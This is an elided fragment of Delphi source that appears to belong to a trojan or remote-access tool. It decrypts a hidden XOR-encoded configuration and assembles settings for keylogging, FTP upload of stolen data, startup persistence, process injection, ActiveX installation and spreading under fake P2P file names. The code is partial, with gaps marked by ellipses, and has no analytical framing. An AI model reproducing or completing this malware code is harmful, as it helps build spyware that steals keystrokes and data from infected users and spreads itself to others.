...
uses
  Windows, UnitFunctions, UnitEncryption, UnitConstants;
...
var
  ...
  _ActiveX, _SpreadAs, _P2PNames, _Windows: string;
...
begin
  Result := False;
  if not FileExists(AppDataDir + IntToStr(GetCurrentProcessId)) then Exit;
  TmpStr := FileToStr(AppDataDir + IntToStr(GetCurrentProcessId));
  TmpStr := XorEnDecrypt(TmpStr);
  if TmpStr = '' then Exit;
  ClientPath := Copy(TmpStr, 1, Pos('|', TmpStr) - 1);
  Delete(TmpStr, 1, Pos('|', TmpStr));
  DatasPath := TmpStr;
  MyDeleteFile(AppDataDir + IntToStr(GetCurrentProcessId));
  Result := True;
end;                                            
...
var
  ...
  i: Integer;
begin
  if not FileExists(ConfigFile) then ExitProcess(0);
  TmpStr := FileToStr(ConfigFile);
  TmpStr := XorEnDecrypt(TmpStr);
  if TmpStr = '' then ExitProcess(0);
...
begin
  ...
  Result := Result + IntToStr(_Delay) + '|' + IntToStr(_FTPPort) + '|' +
    IntToStr(_FTPDelay) + '|' + IntToStr(_KeylogSize) + '|' +
    NewGroup + '|' + NewIdentification + '|' + _StartupKey + '|' + _Password + '|' +
    _MutexName + '|' + _Foldername + '|' + _FileName + '|' + _Destination + '|' +
    _InjectInto + '|' + _ActiveX + '|' + _SpreadAs + '|' + _P2PNames + '|' + _Windows + '|' +
